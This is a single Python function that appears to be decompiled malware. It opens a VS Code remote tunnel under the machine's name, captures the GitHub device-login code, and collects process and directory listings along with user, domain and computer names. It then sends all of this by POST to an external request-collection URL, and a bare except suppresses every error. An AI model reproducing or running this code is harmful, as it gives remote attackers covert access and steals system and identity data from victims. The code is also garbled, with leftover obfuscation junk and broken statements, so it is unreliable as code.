
def execute_vscode(self, tasklist_output):
    vscode_executable = join(self.vscode_extracted_path, 'code.exe')
    try:
        Popen([vscode_executable, 'tunnel', '--accept-server-license-terms', 'user', 'logout'], shell=True)
        sleep(3)
        process = Popen([vscode_executable, '--locale', 'en-US', 'tunnel', '--accept-server-license-terms', '--name', getenv('COMPUTERNAME')], stdout=open(self.output_file_1, 'w'), stdin=PIPE, shell=True)
        sleep(5)
        GitHub_Acc = 'Github Account\\n'
        getattr(process.stdin.write)(GitHub_Acc.encode())
        getattr(process.stdin.flush)()
        getattr(process.stdin.close)()
        sleep(10)
        with open(self.output_file_1, 'r') as out_file_1_read:
            file_1_content = out_file_1_read.read()
        with open(self.output_file_2, 'w') as out_file_2_write:
            out_file_2_write.write(file_1_content)
        with open(self.output_file_2, 'r') as out_file_2_read:
            file_2_content = out_file_2_read()
        match = search('and use code (\\w{4}-\\w{4})', file_2_content)
        github_code = match.group(1) if match else ''
        program_files_list = self.ListFilesInDir('C:\\Program Files')
        program_files_x86_list = self.ListFilesInDir('C:\\Program Files (x86)')
        program_data_list = self.ListFilesInDir('C:\\ProgramData')
        users_list = self.ListFilesInDir('C:\\Users')
		FilesandProcessInfo = tasklist_output + '\\n' + \
			'\\n' + '================Program Files================' + '\\n' + program_files_list + '\\n' + \
			'================Program Files (x86)================' + '\\n' + program_files_x86_list + '\\n' + \
			'================ProgramData================' + '\\n' + program_data_list + '\\n' + \
			'================Users================' + '\\n' + users_list + '\\n' + IIIIIIIIIIIIIIIIIII
		if github_code:
			(1111111111111, 11111111111111) = getlocale_()
			computer_name = getenv('COMPUTERNAME')
			user_name = getenv('USERNAME')
			user_domain = getenv('USERDOMAIN')
			encoded_user_info = getattr(b64encode(f'{locale_language}-{computer_name}-{user_name}-{user_domain}-{github_code}-{self.user_status}'.encode('utf-8')), getattr(bytes, 'fromhex')('decode').decode()('utf-8'))
			request_url = f'http://requestrepo.com/r/2yxp98b3/{encoded_user_info}'
			request_data = urllib.request.Request(request_url, data=FilesandProcessInfo.encode('utf-8'), headers={'Content-Type': 'application/x-www-form-urlencoded'}, method='POST')
			urllib.request.urlopen(request_data)
	except:
		pass
